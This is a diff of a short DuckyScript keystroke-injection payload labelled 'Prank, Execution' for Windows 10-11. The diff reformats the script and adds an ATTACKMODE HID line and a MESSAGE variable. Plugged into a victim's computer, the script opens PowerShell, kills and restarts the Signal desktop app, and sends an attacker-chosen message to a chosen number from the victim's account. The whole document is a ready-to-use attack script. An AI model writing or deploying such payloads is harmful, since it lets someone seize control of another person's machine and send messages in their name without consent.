@@ -1,19 +1,22 @@
-* #########################################
-* #                                       |
-* # Title        : Send Signal Messages   |
-* # Author       : Aleff                  |
-* # Version      : 1.0                    |
-* # Category     : Prank, Execution       |
-* # Target       : Windows 10-11          |
-* #                                       |
-* #########################################
+#########################################
+#                                       #
+# Title        : Send Signal Messages   #
+# Author       : Aleff                  #
+# Version      : 1.0                    #
+# Category     : Prank, Execution       #
+# Target       : Windows 10-11          #
+#                                       #
+#########################################
 
+ATTACKMODE HID
 
-* Requirements:
-*   - Internet Connection
-*   - Signal App installed
-* Payload Plug-And-Play but can be edited as you want the message
+# REQUIREMENTS
+#  - Internet Connection
+#  - Signal App installed
 
+# VARIABLES
+# This is the message that will be sent. You can change it as you want, if you want.
+MESSAGE='example'
 
 QUACK DELAY 1000
 QUACK GUI r
@@ -21,7 +24,7 @@ QUACK DELAY 500
 QUACK STRING powershell
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING Stop-Process -Name "Signal"
+QUACK STRING Stop-Process -Name 'Signal'
 QUACK ENTER
 QUACK STRING Start-Process $Env:USERPROFILE\AppData\Local\Programs\signal-desktop\Signal.exe; exit
 QUACK ENTER
@@ -31,19 +34,16 @@ QUACK TAB
 QUACK TAB
 QUACK ENTER
 QUACK DELAY 100
-* REQUIRED - Receiver number
+# REQUIRED - Receiver number
 QUACK STRING NUMBER
 QUACK DELAY 100
 QUACK TAB
 QUACK DELAY 100
 QUACK ENTER
 QUACK DELAY 200
-
-* This is the message that will be sent.
-* You can change it as you want, if you want.
-QUACK STRING YOUR_MESSAGE
+QUACK STRING $MESSAGE
 QUACK ENTER
 
-* Closing Signal App
+# Closing Signal App
 QUACK DELAY 500
 QUACK ALT F4
